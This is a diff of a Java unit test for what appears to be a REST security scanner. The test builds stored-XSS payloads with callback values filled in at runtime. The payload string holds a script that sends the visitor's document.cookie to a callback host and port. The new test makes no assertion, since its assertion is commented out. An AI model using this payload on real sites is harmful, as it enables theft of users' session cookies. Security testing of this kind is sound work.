@@ -1,6 +1,10 @@
 package restsec;
 
+import jdk.nashorn.internal.runtime.regexp.joni.Config;
 import org.junit.jupiter.api.*;
+
+import java.net.InetAddress;
+import java.net.UnknownHostException;
 
 class ScannerTest {
     @BeforeEach
@@ -14,19 +18,27 @@ class ScannerTest {
     }
 
     @Test
-    @DisplayName("Scanning for XSS with payloads file xss-short.json")
-    void scannerTest() {
-        Thread scannerThread = new Thread(new restsec.Scanner("src/main/resources/attackable/attackset.json", "src/main/resources/payloads/xss-short.json", "xss"));
-        scannerThread.start();
-
+    @DisplayName("Updating standard payload from file with dynamic values")
+    void updatePayloadWithDynamicValuesIP() {
+        String xssPayload = "{\"image\":\"apple_juice.jpg\",\"createdAt\":\"2016-11-23 11:02:05.000 +00:00\",\"deletedAt\":null,\"price\":1.99,\"name\":\"Apple Juice (1000ml)\",\"description\":\"Stored XSS (calls malicious Server) : <script>(new Image).src = 'http://0.0.0.0:5555/Cookie:' + document.cookie</script>\",\"id\":1,\"updatedAt\":\"2016-11-23 11:02:05.000 +00:00\"}";
+        String inetAddress = "0.0.0.0";
+        int callbackPort = 5555;
         try {
-            scannerThread.join();
-        } catch (InterruptedException e) {
-            e.printStackTrace();
+            inetAddress = InetAddress.getLocalHost().getHostAddress();
+            Configuration configuration = new Configuration();
+            callbackPort = configuration.getJettyCallbackPort();
+        } catch (UnknownHostException uhe) {
+            uhe.printStackTrace();
         }
-
-        System.out.println("Scanner Thread completed.");
-
+        String expected = "{\"image\":\"apple_juice.jpg\",\"createdAt\":\"2016-11-23 11:02:05.000 +00:00\",\"deletedAt\":null,\"price\":1.99,\"name\":\"Apple Juice (1000ml)\",\"description\":\"Stored XSS (calls malicious Server) : <script>(new Image).src = 'http://"+inetAddress+":"+callbackPort+"/Cookie:' + document.cookie</script>\",\"id\":1,\"updatedAt\":\"2016-11-23 11:02:05.000 +00:00\"}";
+        //Thread scannerThread = new Thread(new restsec.Scanner("src/main/resources/attackable/attackset.json", "src/main/resources/payloads/xss-short.json", "xss"));
+        //scannerThread.start();
+        //Assertions.assertEquals(Scanner.updatePayloadWithCallbackValues(xssPayload), expected);
+        //try {
+        //    scannerThread.join();
+        //} catch (InterruptedException ie) {
+        //    ie.printStackTrace();
+        //}
     }
 
 }
